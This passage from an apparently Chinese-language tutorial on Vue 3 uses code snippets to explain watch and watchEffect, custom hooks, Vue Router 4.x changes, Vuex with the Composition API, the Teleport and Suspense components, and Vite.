<li>reactive &#x54CD;&#x5E94;&#x5F0F;&#x6570;&#x636E;&#x4E2D;&#x7684;&#x5C5E;&#x6027;&#x4E0D;&#x80FD;&#x76F4;&#x63A5;&#x4FA6;&#x542C;&#xFF0C;&#x9700;&#x4F7F;&#x7528;&#x8FD4;&#x56DE;&#x8BE5;&#x5C5E;&#x6027;&#x7684; getter &#x51FD;&#x6570;&#x4F5C;&#x4E3A;&#x6570;&#x636E;&#x6E90;&#x3002;&#x5F53;&#x4FA6;&#x542C;&#x5C5E;&#x6027;&#x662F;&#x5BF9;&#x8C61;&#x7C7B;&#x578B;&#x65F6;&#xFF0C;&#x4E0D;&#x4F1A;&#x81EA;&#x52A8;&#x5F00;&#x542F;&#x6DF1;&#x5C42;&#x4FA6;&#x542C;&#xFF0C;&#x9700;&#x8981;&#x624B;&#x52A8;&#x5F00;&#x542F;&#x3002;</li>
</ul>
<pre><code class="language-jsx">watch(() =&gt; xxx.dataSource, (newValue, oldValue) =&gt; {...})
watch([() =&gt; xxx.dataSource01, () =&gt; xxx.dataSource02], (newValue, oldValue) =&gt; {...})
</code></pre>
<p>&#x4FA6;&#x6D4B;&#x7684;&#x662F;&#x7ED3;&#x6784;&#xFF0C;&#x4E0D;&#x662F;&#x5177;&#x4F53;&#x7684;&#x503C;&#xFF0C;&#x6545;&#x57FA;&#x672C;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x7684; RefImpl &#x5BF9;&#x8C61;&#x4E0D;&#x9700;&#x8981;&#x901A;&#x8FC7; .value &#x6307;&#x5B9A;&#x503C;&#x4F5C;&#x4E3A;&#x6570;&#x636E;&#x6E90;&#x3002;</p>
<p>&#x5C06;&#x5BF9;&#x8C61;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x4F20;&#x5165; ref &#x51FD;&#x6570;&#x6240;&#x751F;&#x6210;&#x7684;&#x54CD;&#x5E94;&#x5F0F;&#x6570;&#x636E;&#xFF0C;&#x9700;&#x8981;&#x901A;&#x8FC7; .value &#x6307;&#x5B9A;&#x624D;&#x53EF;&#x4F5C;&#x4E3A;&#x6570;&#x636E;&#x6E90;&#x3002;&#x56E0; RefImpl &#x4E2D;&#x7684; value &#x5C5E;&#x6027;&#xFF08;Proxy &#x5BF9;&#x8C61;&#xFF09;&#x4E0D;&#x518D;&#x662F;&#x57FA;&#x672C;&#x7C7B;&#x578B;&#xFF0C;&#x53EA;&#x6709;&#x5728;&#x6574;&#x4E2A;&#x88AB;&#x66FF;&#x6362;&#x65F6;&#xFF08;&#x5185;&#x5B58;&#x4E2D;&#x7684;&#x5730;&#x5740;&#x6539;&#x53D8;&#xFF09;&#xFF0C;&#x53D8;&#x5316;&#x624D;&#x53EF;&#x4EE5;&#x88AB;&#x76D1;&#x89C6;&#x53D1;&#x73B0;&#x3002;&#x6B64;&#x5916;&#x5F00;&#x542F;&#x6DF1;&#x5EA6;&#x76D1;&#x89C6;&#x4E5F;&#x53EF;</p>
<p>&#x4E0E;&#x9700;&#x8981;&#x663E;&#x793A;&#x6307;&#x5B9A;&#x4F9D;&#x8D56;&#x7684; watch &#x4E0D;&#x540C;&#xFF0C;watchEffect &#x4F1A;&#x7ACB;&#x5373;&#x6267;&#x884C;&#x4F20;&#x5165;&#x7684;&#x51FD;&#x6570;&#xFF0C;&#x5E76;&#x5728;&#x6267;&#x884C;&#x8FC7;&#x7A0B;&#x4E2D;&#x8FFD;&#x8E2A;&#x4F9D;&#x8D56;&#xFF0C;&#x5F53;&#x4F9D;&#x8D56;&#x53D8;&#x66F4;&#x65F6;&#x4F1A;&#x91CD;&#x65B0;&#x8FD0;&#x884C;&#x8BE5;&#x51FD;&#x6570;&#x3002;&#x9002;&#x5408;&#x4F9D;&#x8D56;&#x548C;&#x903B;&#x8F91;&#x5F3A;&#x76F8;&#x5173;&#x7684;&#x573A;&#x666F;&#x3002;</p>
<pre><code class="language-javascript">const count = ref(0)
watchEffect(() =&gt; console.log(count.value)) // -&gt; logs 0
setTimeout(() =&gt; { count.value++ }, 1000) // -&gt; logs 1
</code></pre>
<p>&#x4E0E; watchEffect &#x76F8;&#x6BD4;&#xFF0C;watch &#x5141;&#x8BB8;&#x60F0;&#x6027;&#x5730;&#x6267;&#x884C;&#x526F;&#x4F5C;&#x7528;&#xFF0C;&#x5373;&#x56DE;&#x8C03;&#x4EC5;&#x5728;&#x4FA6;&#x542C;&#x6E90;&#x53D1;&#x751F;&#x66F4;&#x6539;&#x65F6;&#x8C03;&#x7528;&#xFF1B;&#x66F4;&#x5177;&#x4F53;&#x5730;&#x8BF4;&#x660E;&#x5E94;&#x89E6;&#x53D1;&#x4FA6;&#x542C;&#x5668;&#x91CD;&#x65B0;&#x8FD0;&#x884C;&#x7684;&#x72B6;&#x6001;&#xFF1B;&#x80FD;&#x8BBF;&#x95EE;&#x88AB;&#x4FA6;&#x542C;&#x72B6;&#x6001;&#x7684;&#x5148;&#x524D;&#x503C;&#x548C;&#x5F53;&#x524D;&#x503C;&#x3002;watchEffect &#x5728;&#x76D1;&#x89C6;&#x56DE;&#x8C03;&#x4E2D;&#x4F7F;&#x7528;&#x4E86;&#x4EC0;&#x4E48;&#x5C5E;&#x6027;&#xFF0C;&#x5C31;&#x9ED8;&#x8BA4;&#x76D1;&#x542C;&#x4EC0;&#x4E48;&#x5C5E;&#x6027;&#x3002;watchEffect &#x4E00;&#x5B9A;&#x7A0B;&#x5EA6;&#x4E0A;&#x548C; computed &#x7C7B;&#x4F3C;&#xFF0C;&#x4F46;&#x524D;&#x8005;&#x66F4;&#x6CE8;&#x91CD;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x7684;&#x51FD;&#x6570;&#x4F53;&#xFF0C;&#x6240;&#x4EE5;&#x4E0D;&#x9700;&#x8981;&#x5199;&#x8FD4;&#x56DE;&#x503C;&#xFF0C;&#x540E;&#x8005;&#x6CE8;&#x91CD;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x7684;&#x8FD4;&#x56DE;&#x503C;&#xFF0C;&#x6240;&#x4EE5;&#x4E00;&#x5B9A;&#x5F97;&#x5199;&#x3002;</p>
<pre><code class="language-javascript">// !!&#x5355;&#x4E00;&#x6E90;
// &#x4FA6;&#x542C;&#x4E00;&#x4E2A; getter
const state = reactive({ count: 0 })
watch(
  () =&gt; state.count,
  (count, prevCount) =&gt; {
    /* ... */
  }
)
// &#x76F4;&#x63A5;&#x4FA6;&#x542C;&#x4E00;&#x4E2A; ref
const count = ref(0)
watch(count, (count, prevCount) =&gt; {
  /* ... */
})

// !!&#x591A;&#x4E2A;&#x6E90;
watch([fooRef, barRef], ([foo, bar], [prevFoo, prevBar]) =&gt; {
  /* ... */
})
</code></pre>
<p>&#x67D0;&#x4E9B;&#x60C5;&#x51B5;&#x4E0B;&#x9700;&#x8981;&#x505C;&#x6B62;&#x4FA6;&#x542C;&#x5668;&#xFF0C;&#x6B64;&#x65F6;&#x5E94;&#x8C03;&#x7528; watch &#x6216; watchEffect &#x8FD4;&#x56DE;&#x7684;&#x51FD;&#x6570;&#x3002;</p>
<pre><code class="language-jsx">const stopWatchXxx = watchEffect(() =&gt; {
  console.log(&quot;watch execution...&quot;, xxx.value);
})
const changeXxx = () =&gt; {
  xxx.value++;
  if(xxx.value &gt; 6) { stopWatch(); }
};
</code></pre>
<h3 id="%E8%87%AA%E5%AE%9A%E4%B9%89-hooks">&#x81EA;&#x5B9A;&#x4E49; Hooks</h3>
<p>Hooks &#x672C;&#x8D28;&#x662F;&#x51FD;&#x6570;&#xFF0C;&#x628A; setup &#x4E2D;&#x4F7F;&#x7528;&#x7684; composition API &#x8FDB;&#x884C;&#x5C01;&#x88C5;&#xFF0C;&#x7C7B;&#x4F3C; mixin&#x3002;</p>
<pre><code class="language-javascript">import { reactive, onMounted, onBeforeUnmount } from &quot;vue&quot;;
export default function (){
  let pointPosition = reactive({ x: 0, y: 0 });
  function savePoint(event){
    pointPosition.x = event.pageX
    pointPosition.y = event.pageY
  }
  onMounted(() =&gt; { window.addEventListener(&apos;click&apos;, savePoint) })
  onBeforeUnmount(() =&gt; { window.removeEventListener(&apos;click&apos;, savePoint) })
  return pointPosition
}
</code></pre>
<pre><code class="language-javascript">// utils/useCounter.js
import { ref } from &quot;vue&quot;;
export default function (){
  let counter = ref(100);
  const increment = () =&gt; { counter.value++; console.log(counter.value); };
  const decrement = () =&gt; { counter.value--; console.log(counter.value); };
  return { counter, increment, decrement };
}
// xxx.vue
export default {
  setup(){
    return { ...useCounter() }
  }
}
</code></pre>
<pre><code class="language-jsx">import { ref, watch } from &quot;vue&quot;;
export default function (val){
  const title = ref(val);
  watch(title, (newValue) =&gt; {
    document.title = newValue;
  }, {
    immediate: true
  })
  return title
}
</code></pre>
<h3 id="%E5%93%8D%E5%BA%94%E5%BC%8F%E6%95%B0%E6%8D%AE%E5%88%A4%E6%96%AD">&#x54CD;&#x5E94;&#x5F0F;&#x6570;&#x636E;&#x5224;&#x65AD;</h3>
<ul>
<li>
<p>isRef =&gt; &#x68C0;&#x67E5;&#x4E00;&#x4E2A;&#x503C;&#x662F;&#x5426;&#x4E3A; ref &#x5BF9;&#x8C61;</p>
</li>
<li>
<p>isReactive =&gt; &#x68C0;&#x67E5;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#x662F;&#x5426;&#x662F;&#x7531; reactive &#x521B;&#x5EFA;&#x7684;&#x54CD;&#x5E94;&#x5F0F;&#x4EE3;&#x7406;</p>
</li>
<li>
<p>isReadonly =&gt; &#x68C0;&#x67E5;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#x662F;&#x5426;&#x662F;&#x7531; readonly &#x521B;&#x5EFA;&#x7684;&#x54CD;&#x5E94;&#x5F0F;&#x4EE3;&#x7406;</p>
</li>
<li>
<p>isProxy =&gt; &#x68C0;&#x67E5;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#x662F;&#x5426;&#x662F;&#x7531; reactive &#x6216; readonly &#x65B9;&#x6CD5;&#x521B;&#x5EFA;&#x7684;&#x4EE3;&#x7406;</p>
</li>
</ul>
<h3 id="vue-router-4x">Vue Router 4.x</h3>
<ul>
<li>&#x521B;&#x5EFA;&#x8DEF;&#x7531;&#x5B9E;&#x4F8B;&#x7684;&#x65B9;&#x5F0F;&#x6539;&#x53D8;</li>
</ul>
<p>&#x4ECE; v3.x &#x4E2D;&#x4EE5; <a href="https://v3.router.vuejs.org/zh/guide/#javascript">new VueRouter</a> &#x7684;&#x65B9;&#x5F0F;&#x521B;&#x5EFA;&#x8DEF;&#x7531;&#x5B9E;&#x4F8B;&#xFF0C;&#x5230; v4.x &#x4E2D;&#x6539;&#x7528; <a href="https://router.vuejs.org/zh/guide/#javascript">createRouter</a>&#x3002;</p>
<pre><code class="language-javascript">// &#x521B;&#x5EFA;&#x8DEF;&#x7531;&#x5B9E;&#x4F8B;&#x5E76;&#x4F20;&#x9012; `routes` &#x914D;&#x7F6E;
const router = VueRouter.createRouter({
  history: VueRouter.createWebHashHistory(), // &#x4F7F;&#x7528; hash &#x6A21;&#x5F0F;
  routes, // `routes: routes` &#x7684;&#x7F29;&#x5199;
})
</code></pre>
<p>&#x786E;&#x4FDD; _use_ &#x8DEF;&#x7531;&#x5B9E;&#x4F8B;&#x4F7F;&#x6574;&#x4E2A;&#x5E94;&#x7528;&#x652F;&#x6301;&#x8DEF;&#x7531; =&gt; app.use(router)&#x3002;</p>
<ul>
<li>&#x8DEF;&#x7531;&#x6A21;&#x5F0F;&#x914D;&#x7F6E;&#x7684;&#x6539;&#x53D8;</li>
</ul>
<p>&#x5728; v3.x &#x4E2D;&#x7684;&#x8DEF;&#x7531;&#x6A21;&#x5F0F;&#x662F;&#x901A;&#x8FC7; mode &#x5C5E;&#x6027;&#x63A7;&#x5236;&#xFF08;&#x503C;&#x4E3A;&#x5B57;&#x7B26;&#x4E32;&#xFF09;&#xFF0C;&#x73B0;&#x901A;&#x8FC7; import &#x5F15;&#x5165;&#x4E0D;&#x540C;&#x51FD;&#x6570;&#x6765;&#x6307;&#x5B9A;&#x5BF9;&#x5E94;<a href="https://router.vuejs.org/zh/api/#createwebhistory">&#x8DEF;&#x7531;&#x6A21;&#x5F0F;</a>&#x3002;mode &#x5C5E;&#x6027;&#x6539;&#x4E3A; history&#x3002;</p>
<pre><code class="language-javascript">&quot;history&quot; =&gt; createWebHistory()
&quot;hash&quot; =&gt; createWebHashHistory()
&quot;abstract&quot; =&gt; createMemoryHistory()
</code></pre>
<ul>
<li>4.x Composition API =&gt; &#x8DEF;&#x7531;&#x5730;&#x5740;&#x548C;&#x8DEF;&#x7531;&#x5B9E;&#x4F8B;&#x9700;&#x4EE5; hooks &#x7684;&#x5F62;&#x5F0F;&#x8C03;&#x7528;&#x53D6;&#x5F97;</li>
<li>&#x6355;&#x83B7;&#x8DEF;&#x7531;&#x4E0E; 404 Not found &#x8DEF;&#x7531; =&gt; pathMatch</li>
</ul>
<p>&#x5BF9;&#x4E8E;&#x672A;&#x5339;&#x914D;&#x5230;&#x7684;&#x8DEF;&#x7531;&#xFF0C;&#x53EF;&#x901A;&#x8FC7;&#x7F16;&#x5199;&#x52A8;&#x6001;&#x8DEF;&#x7531;&#x5339;&#x914D;&#x6240;&#x6709;&#x9875;&#x9762;&#xFF0C;&#x5E76;&#x4F7F;&#x7528;&#x6307;&#x5B9A;&#x53C2;&#x6570;&#x83B7;&#x53D6;&#x5339;&#x914D;&#x5185;&#x5BB9;&#x3002;</p>
<pre><code class="language-js">{ path: &quot;/:pathMatch(.*)&quot;, component: () =&gt; import(&quot;../pages/NotFound.vue&quot;) }
</code></pre>
<pre><code class="language-js">&lt;span&gt;Not Found: {{ this.$route.params.pathMatch }}&lt;/span&gt;
</code></pre>
<p><code>/:pathMatch(.*)</code> &#x548C; <code>/:pathMatch(.*)*</code> &#x7684;&#x533A;&#x522B;&#x5728;&#x4E8E;&#x7ED3;&#x679C;&#x662F;&#x5426;&#x8FDB;&#x884C;&#x89E3;&#x6790;&#x3002;</p>
<pre><code class="language-js">Not Found: [&quot;hello&quot;, &quot;vue-router&quot;, &quot;not-found&quot;] // /:pathMatch(.*)*
Not Found: hello/vue-router/not-found // /:pathMatch(.*)
</code></pre>
<ul>
<li>&#x52A8;&#x6001;&#x6DFB;&#x52A0;&#x8DEF;&#x7531; =&gt; &#x5F00;&#x53D1;&#x4E2D;&#x5E38;&#x6839;&#x636E;&#x7528;&#x6237;&#x7684;&#x4E0D;&#x540C;&#x6743;&#x9650;&#x6765;&#x6CE8;&#x518C;&#x4E0D;&#x540C;&#x7684;&#x8DEF;&#x7531;</li>
</ul>
<p>v4.x &#x4E2D;&#x5E9F;&#x5F03; router.addRoutes&#xFF0C;&#x4EC5;&#x5B58; router.addRoute&#x3002;</p>
<pre><code class="language-typescript">/* &#x51FD;&#x6570;&#x7B7E;&#x540D; */
addRoute([parentName: string,] route: RouteConfig): () =&gt; void
</code></pre>
<p>&#x6DFB;&#x52A0;&#x65B0;&#x8DEF;&#x7531;&#x89C4;&#x5219;&#x65F6;&#x82E5;&#x6709;&#x8BBE;&#x7F6E; name&#xFF0C;&#x4F1A;&#x5BF9;&#x6B64;&#x524D;&#x540C; name &#x7684;&#x8DEF;&#x7531;&#x89C4;&#x5219;&#x8FDB;&#x884C;&#x8986;&#x76D6;&#x3002;</p>
<pre><code class="language-jsx">const categoryRoute = {
  path: &quot;/category&quot;, component: () =&gt; import(&quot;../pages/Category.vue&quot;)
}
router.addRoute(categoryRoute);
</code></pre>
<pre><code class="language-jsx">const hardwareTestRoute = {
  path: &quot;hardware-test&quot;,
  component: () =&gt; import(&quot;../pages/HardwareTest.vue&quot;)
}
router.addRoute(&quot;hardware&quot;, hardwareTestRoute);
</code></pre>
<ul>
<li>&#x8DEF;&#x7531;&#x5BFC;&#x822A;&#x5B88;&#x536B;</li>
</ul>
<blockquote>
<p>vue-router &#x63D0;&#x4F9B;&#x7684;&#x5BFC;&#x822A;&#x5B88;&#x536B;&#x4E3B;&#x8981;&#x7528;&#x6765;&#x901A;&#x8FC7;&#x8DF3;&#x8F6C;&#x6216;&#x53D6;&#x6D88;&#x7684;&#x65B9;&#x5F0F;&#x5B88;&#x536B;&#x5BFC;&#x822A;</p>
</blockquote>
<p>&#x5168;&#x5C40;&#x524D;&#x7F6E;&#x5B88;&#x536B; beforeEach &#x5728;&#x5BFC;&#x822A;&#x89E6;&#x53D1;&#x65F6;&#x56DE;&#x8C03;&#xFF0C;&#x63A5;&#x6536;&#x5373;&#x5C06;&#x8FDB;&#x5165;&#x548C;&#x79BB;&#x5F00;&#x7684; Route &#x8DEF;&#x7531;&#x5BF9;&#x8C61; to &amp; from&#x3002;&#x5176;&#x8FD4;&#x56DE;&#x503C; false &#x8868;&#x793A;&#x53D6;&#x6D88;&#x5F53;&#x524D;&#x5BFC;&#x822A;&#xFF0C;&#x4E0D;&#x8FD4;&#x56DE;&#x6216;&#x8FD4;&#x56DE; undefined &#x5219;&#x8FDB;&#x884C;&#x9ED8;&#x8BA4;&#x5BFC;&#x822A;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x8FD4;&#x56DE;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;&#x7684;&#x8DEF;&#x7531;&#x5730;&#x5740;&#xFF0C;&#x6216;&#x8005;&#x5305;&#x542B;&#x8DEF;&#x5F84;&#x53C2;&#x6570;&#x7684;&#x5BF9;&#x8C61;&#x3002;</p>
<p>&#x7B2C;&#x4E09;&#x4E2A;&#x53EF;&#x9009;&#x7684;&#x53C2;&#x6570; next &#x4E0D;&#x63A8;&#x8350;&#x4F7F;&#x7528;&#x3002;&#x5728; Vue2 &#x4E2D;&#x901A;&#x8FC7; next &#x51FD;&#x6570;&#x51B3;&#x5B9A;&#x5982;&#x4F55;&#x8DF3;&#x8F6C;&#xFF0C;&#x4F46;&#x662F;&#x5728; Vue3 &#x4E2D;&#x5E94;&#x901A;&#x8FC7;&#x8FD4;&#x56DE;&#x503C;&#x63A7;&#x5236;&#xFF0C;&#x4E14;&#x5E94;&#x907F;&#x514D;&#x591A;&#x6B21;&#x7684;&#x8C03;&#x7528; next&#x3002;</p>
<h3 id="vuex">Vuex</h3>
<p>&#x7EC4;&#x4EF6;&#x5316;&#x5F00;&#x53D1;&#x4E2D;&#xFF0C;data &#x5B9A;&#x4E49;&#x6216;&#x5728; setup &#x91CC;&#x4F7F;&#x7528;&#x7684;&#x6570;&#x636E;&#x53EF;&#x770B;&#x4F5C; State&#xFF1B;&#x6A21;&#x677F; template &#x6700;&#x7EC8;&#x4F1A;&#x88AB;&#x6E32;&#x67D3;&#x6210; DOM&#xFF0C;&#x79F0;&#x4E4B; View&#xFF1B;State &#x7684;&#x4FEE;&#x6539;&#x8054;&#x7CFB;&#x6A21;&#x5757;&#x5185;&#x7684;&#x884C;&#x4E3A;&#x4E8B;&#x4EF6; Actions&#x3002;</p>
<ul>
<li>&#x7EC4;&#x5408;&#x5F0F; API</li>
</ul>
<p>&#x8C03;&#x7528; useStore &#x51FD;&#x6570;&#x5728; setup &#x91CC;&#x8BBF;&#x95EE; store&#xFF0C;&#x4E0E;&#x9009;&#x9879;&#x5F0F; API &#x8BBF;&#x95EE; this.$store &#x7B49;&#x6548;&#x3002;</p>
<pre><code class="language-jsx">import { toRefs } from &quot;vue&quot;;
import { useStore } from &quot;vuex&quot;;
const store = useStore();
const { counter } = toRefs(store.state);
function increment(){ store.commit(&quot;increment&quot;)}
</code></pre>
<ul>
<li>&#x72B6;&#x6001;&#x6620;&#x5C04;&#x5230;&#x7EC4;&#x4EF6;&#x4FDD;&#x6301;&#x54CD;&#x5E94;&#x5F0F;</li>
</ul>
<pre><code class="language-jsx">import { computed, toRefs } from &quot;vue&quot;;
import { useStore, mapState } from &quot;vuex&quot;;
const store = useStore();
const { name, level } = mapState([&quot;name&quot;, &quot;level&quot;]);
</code></pre>
<pre><code class="language-jsx">// 1.&#x4F7F;&#x7528; bind &#x7ED1;&#x5B9A;
const responseName = computed(name.bind({$store: store}));
const responseLevel = computed(level.bind({$store: store}));
</code></pre>
<pre><code class="language-jsx">// 2.&#x81EA;&#x5B9A;&#x4E49;&#x5C01;&#x88C5;&#x7684; bind &#x7ED1;&#x5B9A; hook
const { responseName, responseLevel } = useResponseState([&quot;name&quot;, &quot;level&quot;]);
</code></pre>
<pre><code class="language-jsx">import { computed } from &quot;vue&quot;;
import { useStore, mapState } from &quot;vuex&quot;;
export default function useResponseState(mapper){
  const store = useStore();
  const stateMapperRes = mapState(mapper);
  const resState = {};
  Object.keys(stateMapperRes).forEach(key =&gt; {
    resState[key] = computed(stateMapperRes[key].bind({$store: store}))
  })
  return resState
}
</code></pre>
<pre><code class="language-jsx">// 3.toRefs
const { name: responseName, level: responseLevel } = toRefs(store.state);
</code></pre>
<h3 id="%E5%86%85%E7%BD%AE%E7%BB%84%E4%BB%B6">&#x5185;&#x7F6E;&#x7EC4;&#x4EF6;</h3>
<ul>
<li><a href="https://v3.vuejs.org/guide/teleport.html#teleport">Teleport</a> =&gt; &#x5C06;&#x7EC4;&#x4EF6;&#x7684; HTML &#x7ED3;&#x6784;&#x79FB;&#x52A8;&#x5230;&#x6307;&#x5B9A;&#x4F4D;&#x7F6E;</li>
</ul>
<p>&#x5F00;&#x53D1;&#x4E2D;&#x4E0D;&#x60F3;&#x8BA9;&#x5E38;&#x89C4;&#x5904;&#x4E8E;&#x5C4F;&#x5E55;&#x4E2D;&#x592E;&#x7684;&#x5F39;&#x7A97;&#x7ED3;&#x6784;&#x51FA;&#x73B0;&#x5728;&#x540E;&#x4EE3;&#x7EC4;&#x4EF6;&#x7684;&#x5185;&#x90E8;&#xFF0C;&#x56E0;&#x7EC4;&#x4EF6;&#x6811;&#x4E0A;&#x7684;&#x4EFB;&#x4F55;&#x5B58;&#x5728;&#x7684;&#x5B9A;&#x4F4D;&#x90FD;&#x53EF;&#x80FD;&#x4F7F;&#x5185;&#x90E8;&#x5B9A;&#x4F4D;&#x6837;&#x5F0F;&#x53D7;&#x5230;&#x5E72;&#x6270;&#x3002;</p>
<iframe src="https://codesandbox.io/embed/vue3support-xu8og?fontsize=14&amp;hidenavigation=1&amp;theme=dark" style="width:100%; height:500px; border:0; border-radius: 4px; overflow:hidden;" title="vue3support" allow="accelerometer; ambient-light-sensor; camera; encrypted-media; geolocation; gyroscope; hid; microphone; midi; payment; usb; vr; xr-spatial-tracking" sandbox="allow-forms allow-modals allow-popups allow-presentation allow-same-origin allow-scripts"></iframe>
<ul>
<li><a href="https://v3.vuejs.org/guide/migration/suspense.html#introduction">Suspense(experimental)</a> =&gt; &#x7B49;&#x5F85;&#x5F02;&#x6B65;&#x7EC4;&#x4EF6;&#x65F6;&#x6E32;&#x67D3;&#x989D;&#x5916;&#x7684;&#x5185;&#x5BB9;</li>
</ul>
<p>&#x5F02;&#x6B65;&#x7EC4;&#x4EF6;&#x9700;&#x501F;&#x52A9; defineAsyncComponent &#x51FD;&#x6570;&#xFF0C;import &#x7684;&#x8C03;&#x7528;&#x7ED3;&#x679C;&#x4F5C;&#x4E3A;&#x8FD4;&#x56DE;&#x503C;&#x3002;</p>
<pre><code class="language-jsx">// &#x52A8;&#x6001;|&#x5F02;&#x6B65;&#x5F15;&#x5165;
import {defineAsyncComponent} from &apos;vue&apos;
const Xxx = defineAsyncComponent(() =&gt; import(&apos;./components/Xxx.vue&apos;))
// &#x9759;&#x6001;&#x5F15;&#x5165;
import Xxx from &apos;./component/Xxx.vue&apos;
</code></pre>
<p>&#x9759;&#x6001;&#x5F15;&#x5165;&#x7684;&#x6F5C;&#x5728;&#x98CE;&#x9669;&#x662F;&#x5F53;&#x5D4C;&#x5957;&#x6700;&#x6DF1;&#x7684;&#x7EC4;&#x4EF6;&#x6E32;&#x67D3;&#x8FDF;&#x6EDE;&#x65F6;&#xFF0C;&#x4F1A;&#x62D6;&#x6162;&#x5176;&#x5916;&#x5C42;&#x6240;&#x6709;&#x7EC4;&#x4EF6;&#x7684;&#x6E32;&#x67D3;&#x3002;&#x52A8;&#x6001;&#x5F15;&#x5165;&#x7684;&#x95EE;&#x9898;&#x662F;&#x5F53;&#x7F51;&#x901F;&#x8F83;&#x6162;&#x65F6;&#xFF0C;&#x5D4C;&#x5957;&#x7684;&#x5185;&#x5BB9;&#x6E32;&#x67D3;&#x53EF;&#x80FD;&#x4F1A;&#x51FA;&#x73B0;&#x6296;&#x52A8;&#x7684;&#x60C5;&#x51B5;&#x3002;&#x6296;&#x52A8;&#x53EF;&#x901A;&#x8FC7;&#x65E0;&#x9700;&#x5F15;&#x5165;&#x7684;&#x5185;&#x7F6E;&#x7EC4;&#x4EF6; Suspense &#x6765;&#x89E3;&#x51B3;&#xFF0C;&#x5176;&#x5E95;&#x5C42;&#x901A;&#x8FC7;&#x63D2;&#x69FD;&#x5B9E;&#x73B0;&#x3002;Suspense &#x7EC4;&#x4EF6;&#x6709;&#x4E24;&#x4E2A;&#x4EC5;&#x63A5;&#x6536;&#x4E00;&#x4E2A;&#x76F4;&#x63A5;&#x5B50;&#x8282;&#x70B9;&#x7684;&#x63D2;&#x69FD;&#x3002;</p>
<pre><code class="language-jsx">&lt;Suspense&gt;
  &lt;template v-slot:default&gt;
    &lt;Xxx&gt; // &#x5F85;&#x5C55;&#x793A;&#x7EC4;&#x4EF6;&#x653E;&#x5165; default &#x63D2;&#x69FD;
  &lt;/template&gt;
  &lt;template v-slot:fallback&gt;
    &lt;Yyy&gt; // &#x5907;&#x7528;&#x5C55;&#x793A;&#x5185;&#x5BB9;&#x653E;&#x5165; fallback &#x63D2;&#x69FD;
  &lt;/template&gt;
&lt;/Suspense&gt;
</code></pre>
<p>setup &#x4E0D;&#x80FD;&#x662F; async &#x51FD;&#x6570;&#xFF08;&#x5F02;&#x6B65;&#x7EC4;&#x4EF6;&#x9664;&#x5916;&#xFF09;&#xFF0C;&#x56E0;&#x5176;&#x8FD4;&#x56DE;&#x503C;&#x4E0D;&#x662F;&#x5BF9;&#x8C61;&#xFF0C;&#x800C;&#x662F;&#x6A21;&#x677F;&#x89E3;&#x6790;&#x4E0D;&#x4E86;&#x7684; Promise&#xFF0C;&#x6B64;&#x65F6;&#x6A21;&#x677F;&#x83B7;&#x53D6;&#x4E0D;&#x5230; return &#x5BF9;&#x8C61;&#x4E2D;&#x7684;&#x5C5E;&#x6027;&#x3002;</p>
<p>&#x5F53;&#x4F7F;&#x7528; Suspense &#x4E0E; defineAsyncComponent &#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x8FD4;&#x56DE;&#x5F02;&#x6B65; Promise &#x5B9E;&#x4F8B;&#x3002;</p>
<iframe src="https://codesandbox.io/embed/suspense-ow5mf?fontsize=14&amp;hidenavigation=1&amp;theme=dark" style="width:100%; height:500px; border:0; border-radius: 4px; overflow:hidden;" title="suspense" allow="accelerometer; ambient-light-sensor; camera; encrypted-media; geolocation; gyroscope; hid; microphone; midi; payment; usb; vr; xr-spatial-tracking" sandbox="allow-forms allow-modals allow-popups allow-presentation allow-same-origin allow-scripts"></iframe>
<h3 id="vite"><a href="https://cn.vitejs.dev/guide/">Vite</a></h3>
<p>&#x5728;&#x4E0D;&#x63D0;&#x4F9B;&#x5757;&#x7EA7;&#x4F5C;&#x7528;&#x57DF;&#x65F6;&#xFF0C;&#x6A21;&#x5757;&#x5316;&#x5E38;&#x7528;&#x793E;&#x533A;&#x89C4;&#x8303; commonJS &#x4F7F;&#x7528;&#x51FD;&#x6570;&#x4F5C;&#x7528;&#x57DF; IIFE &#x8FDB;&#x884C;&#x6A21;&#x62DF;&#xFF08;ES6 &#x4E4B;&#x524D;&#x7684; JavaScript &#xFF09;&#x3002;</p>
<ul>
<li>&#x76F8;&#x8F83; Vue CLI&#xFF0C;&#x8F7B;&#x91CF;&#x7EA7;&#x811A;&#x624B;&#x67B6;&#x5DE5;&#x5177; Vite &#x9ED8;&#x8BA4;&#x5B89;&#x88C5;&#x7684;&#x63D2;&#x4EF6;&#x66F4;&#x5C11;</li>
<li>&#x8003;&#x8651;&#x5230;&#x5F00;&#x53D1;&#x8FC7;&#x7A0B;&#x4E2D;&#x4F9D;&#x8D56;&#x589E;&#x52A0;&#x4E0E;&#x989D;&#x5916;&#x914D;&#x7F6E;&#xFF0C;&#x5728;&#x5B9E;&#x9645;&#x9879;&#x76EE;&#x4E2D;&#x8FD8;&#x662F;&#x63A8;&#x8350; Vue CLI</li>
<li>Vite =&gt; &#x57FA;&#x4E8E;&#x7F13;&#x5B58;&#x7684;&#x70ED;&#x66F4;&#x65B0;&#xFF1B;Vue CLI =&gt; &#x57FA;&#x4E8E; Webpack &#x7684;&#x70ED;&#x66F4;&#x65B0;</li>
<li>Vite &#x4F7F;&#x7528; ES6 &#x7684;&#x6A21;&#x5757;&#x5316;&#x52A0;&#x8F7D;&#xFF0C;&#x5728;&#x5F00;&#x53D1;&#x6A21;&#x5F0F;&#x4E2D;&#x4E0D;&#x9700;&#x8981;&#x6253;&#x5305;&#x6784;&#x5EFA;&#x5C31;&#x80FD;&#x76F4;&#x63A5;&#x8FD0;&#x884C;</li>
<li>esbuild &#x9884;&#x6784;&#x5EFA;&#x4F9D;&#x8D56;&#x76F8;&#x6BD4;&#x4E8E; JavaScript &#x7F16;&#x5199;&#x7684; Webpack &#x5728;&#x901F;&#x5EA6;&#x4E0A;&#x66F4;&#x5FEB;</li>
</ul>
<blockquote>
